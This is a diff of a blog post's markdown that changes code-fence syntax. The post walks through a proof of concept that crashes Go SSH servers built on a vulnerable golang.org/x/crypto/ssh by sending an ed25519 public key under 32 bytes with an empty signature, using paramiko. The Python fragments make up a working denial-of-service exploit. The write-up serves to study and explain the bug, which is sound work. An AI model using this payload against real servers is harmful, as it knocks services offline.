@@ -27,7 +27,7 @@ Most of the changes centered around checking the length of an ed25519 keys to en
 
 In order to test the PoC, I needed to build an SSH server using the vulnerable version of the library. This was actually pretty simple thanks to golang.org/x/crypto/ssh.
 
-```
+{% highlight go %}
 package main
 
 import (
@@ -99,7 +99,7 @@ func main() {
 		go handleConnection(nConn, config)
 	}
 }
-```
+{% endhighlight %}
 
 All this server does is listen for SSH connections on port 2022 using public key authentication. For our purposes, we don't really care about the value of the key so we simply set PublicKeyCallback to return `nil` to blindly accept any key that we're given. `PublicKeyCallback`'s second argument is `ssh.PublicKey` so its likely we will have already triggered our `panic` by this point anyways since that would require parsing the key and possibly validating the signature.
 
@@ -258,7 +258,7 @@ Luckily for us, there is a reasonable compromise. The [paramiko](https://www.par
 
 Installing `paramiko` is easy and just involves a simple `pip install paramiko`. Once that is out of the way, we can construct a simple SSH client script:
 
-```
+{% highlight python %}
 import socket
 import paramiko
 
@@ -267,7 +267,7 @@ sock.connect((host, port))
 
 t = paramiko.Transport(sock)
 t.start_client()
-```
+{% endhighlight %}
 
 In the first part of our script, we open a TCP socket to the host / port of our SSH server. We then pass that socket to a new `paramiko.Transport` instance and call the `start_client()` method. This triggers the first part of the SSH handshake (Key Exchange) detailed earlier in this post. This will put us in a perfect spot for us to proceed with the next phase (user authentication) and send our malicious key.
 
@@ -293,13 +293,13 @@ string    service name
 
 and the corresponding Python code looks like this:
 
-```
+{% highlight python %}
 t.lock.acquire()
 m = paramiko.Message()
 m.add_byte(cMSG_SERVICE_REQUEST)
 m.add_string("ssh-userauth")
 t._send_message(m)
-```
+{% endhighlight %}
 
 Next, we will focus on sending the `SSH_MSG_USERAUTH_REQUEST` containing our malicious public key. These messages are specific to the authentication method that you want to use (in this case `publickey`) and are defined in [RFC 4252](https://tools.ietf.org/html/rfc4252#section-7). Once again, you'll notice that the spec for these messages is pretty similar to the code that we're writing in Python. The RFC defines the message structure as:
 
@@ -316,7 +316,7 @@ string    signature
 
 and our Python code looks like this:
 
-```
+{% highlight python %}
 m = paramiko.Message()
 m.add_byte(cMSG_USERAUTH_REQUEST)
 m.add_string(user)
@@ -324,7 +324,7 @@ m.add_string("ssh-connection")
 m.add_string('publickey')
 m.add_boolean(True)
 m.add_string('ssh-ed25519')
-```
+{% endhighlight %}
 
 The astute reader will note that we are missing the public key itself and the signature from our message that we are constructing. That is the next thing we are going to tackle.
 
@@ -339,29 +339,29 @@ string  key
 
 That's pretty straightforward. We know that ed25519 keys are expected to have a `key` that is 32 bytes long. For this attack, we simply want to ensure that `key` is less than 32 bytes long. We can do that with the following Python:
 
-```
+{% highlight python %}
 key = paramiko.Message()
 key.add_string('ssh-ed25519')
 key.add_string('key-that-is-too-short')
 m.add_string(key.__str__())
-```
+{% endhighlight %}
 
 Take notice that `key-that-is-too-short` is 21 bytes long and 21 < 32 which meets our requirement for the key being too short.
 
 The final part of constructing our payload is to add the `signature` required at the end of the message. Luckily for , we're trying to get the server to `panic` while verifying the signature so we don't actually need the signature to validate. In fact, we can even put in an empty string if we want and that's exactly what we're going to do:
 
-```
+{% highlight python %}
 sig = paramiko.Message()
 sig.add_string('ssh-ed25519')
 sig.add_string('')
 m.add_string(sig.__str__())
-```
+{% endhighlight %}
 
 Now that we've composed our completed `SSH_MSG_USERAUTH_REQUEST` message we can go ahead and send it to trigger the `panic` and crash the server:
 
-```
+{% highlight python %}
 t._send_message(m)
-```
+{% endhighlight %}
 
 # Did it work?
 
